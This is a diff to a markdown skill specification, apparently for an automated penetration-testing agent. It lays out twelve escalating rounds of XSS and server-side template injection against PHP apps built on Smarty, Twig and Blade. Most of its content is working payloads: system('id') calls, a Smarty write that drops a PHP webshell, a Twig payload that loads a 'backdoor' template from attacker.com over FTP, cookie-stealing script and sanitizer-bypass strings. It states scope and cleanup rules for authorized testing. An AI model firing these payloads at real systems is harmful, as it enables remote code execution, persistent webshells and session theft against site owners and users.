@@ -2,7 +2,34 @@
 > **Input**: attack_plans/{sink_id}_plan.json, Docker container access
 > **Output**: exploit_results/{sink_id}_result.json, PoC脚本/{sink_id}_poc.py
 
+
+## Identity
+
+| Field | Value |
+|-------|-------|
+| Skill ID | S-046-B |
+| Phase | Phase-4 (Attack) |
+| Responsibility | Execute progressive multi-round attack against XSS / SSTI (Cross-Site Scripting / Server-Side Template Injection) sinks |
+
+## Input Contract
+
+| File | Source | Required | Fields Used |
+|------|--------|----------|-------------|
+| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
+| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
+| Container | Docker `php` container | ✅ | `exec` access |
+
 ## 12 Attack Rounds
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R1 - Basic Tag Injection and SSTI Probing
 
@@ -21,6 +48,16 @@ SSTI Payload:
 
 Inject into all reflected parameters. Analyze response source for unescaped tags and evaluated expressions.
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R2 - Encoding Bypass
 
 Objective: Bypass input sanitization filters through character encoding.
@@ -37,6 +74,16 @@ SSTI Payload:
 - `\x7b\x7b7*7\x7d\x7d` (hex-encoded curly braces)
 
 Send encoded payloads to test whether the application decodes before or after sanitization.
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R3 - Event Handlers and SSTI Code Execution
 
@@ -58,6 +105,16 @@ SSTI Payload (Smarty):
 - `{system('id')}`
 - `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id');?>",self::clearConfig())}`
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R4 - Tag Obfuscation and Twig _self.env Exploitation
 
 Objective: Bypass tag filters using obfuscated HTML and exploit Twig internal objects.
@@ -74,6 +131,16 @@ SSTI Twig _self.env exploitation:
 - `{{_self.env.setCache("ftp://attacker.com/")}}{{_self.env.loadTemplate("backdoor")}}`
 - `{{_self.env.enableDebug()}}{{_self.env.disableStrictVariables()}}`
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R5 - Smarty {php} and {if} Injection
 
 Objective: Exploit Smarty template engine specific features.
@@ -88,6 +155,16 @@ Payload:
 - `{Smarty_Internal_Write_File::writeFile('/tmp/proof','pwned',self::clearConfig())}`
 
 Send each payload one by one across all Smarty template contexts. Analyze whether `{literal}` blocks prevent injection.
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R6 - DOM-Based XSS
 
@@ -107,6 +184,16 @@ Payload:
 
 Analyze page JavaScript source for sink-source data flow. Use browser developer tools or static analysis.
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R7 - CSP Bypass and Blade @php Injection
 
 Objective: Bypass Content Security Policy and exploit Laravel Blade directives.
@@ -123,6 +210,16 @@ Blade @php injection:
 - `{!! '<script>alert(1)</script>' !!}` (raw output confirmation)
 
 Send Blade directive payloads to test whether they are processed within user-controllable template content.
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R8 - Combination: Stored XSS + SSTI Chain → RCE
 
@@ -143,6 +240,16 @@ Steps:
 
 Full combination: Stored SSTI -> write webshell -> persistent RCE.
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R9 - Mutation XSS (mXSS)
 
 Objective: Exploit browser HTML parser mutation behavior to bypass sanitizers like DOMPurify.
@@ -155,6 +262,16 @@ Payload:
 
 Principle: Switching between different parsing contexts in the HTML spec (math/svg/foreign content) causes the sanitizer and browser to see different DOM trees.
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R10 - Prototype Pollution → XSS
 
 Objective: Achieve client-side prototype pollution through server-side JSON merging.
@@ -164,6 +281,16 @@ Checks:
 - `json_decode()` + deep merge leading to `__proto__` pollution
 - Payload: `{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}`
 - Client-side Lodash/jQuery `$.extend(true, {}, userInput)`
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R11 - PHP 8.x Template Engine New Feature Exploitation
 
@@ -179,6 +306,16 @@ Checks:
 - Smarty 4.x/5.x:
   - Security policy bypass: `{$smarty.const.PHP_VERSION}`
   - Modifier injection: `{"id"|system}`
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R12 - WebSocket / SSE XSS
 
@@ -309,6 +446,64 @@ Record all locations where data is retrieved from DB and output to HTML in `$WOR
 - MUST NOT inject payloads that cause permanent damage. Use identifiable markers for easy cleanup.
 - Stay within the authorized scope; only test authorized applications and document all attempts.
 
+
+
+## Output Contract
+
+| Output File | Path | Description |
+|-------------|------|-------------|
+| Exploit result | `$WORK_DIR/exploit_results/{sink_id}_result.json` | Final verdict + all round records |
+| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Standalone reproduction script |
+| Patch | `$WORK_DIR/修复补丁/{sink_id}_patch.diff` | Recommended fix |
+
+## Examples
+
+### ✅ GOOD Example — Complete, Valid Exploit Result
+
+```json
+{
+  "sink_id": "xss_search_001",
+  "final_verdict": "confirmed",
+  "rounds_executed": 4,
+  "successful_round": 1,
+  "payload": "<script>alert(document.cookie)</script>",
+  "evidence_result": "Unescaped <script> tag rendered in response body, browser executes alert()",
+  "severity": {
+    "level": "H",
+    "score": 2.1,
+    "cvss": 7.0
+  }
+}
+```
+
+**Why this is good:**
+- `evidence_result` contains specific, verifiable proof of exploitation
+- `severity` scoring is consistent: score 2.1 → cvss 7.0 → level `H`
+- `rounds_executed` shows progressive effort, not a single blind attempt
+- All required fields are populated with concrete values
+
+### ❌ BAD Example — Incomplete, Invalid Exploit Result
+
+```json
+{
+  "sink_id": "xss_search_001",
+  "final_verdict": "confirmed",
+  "rounds_executed": 1,
+  "successful_round": 1,
+  "payload": "<script>alert(1)</script>",
+  "evidence_result": "",
+  "failure_reason": "",
+  "severity": {
+    "level": "L",
+    "score": null
+  }
+}
+```
+
+**Issues:**
+- evidence_result is empty — no proof that payload is rendered unescaped
+- failure_reason is empty — no context about output encoding status
+- severity_level 'L' for confirmed reflected XSS — should be at least M or H
 
 ---
 
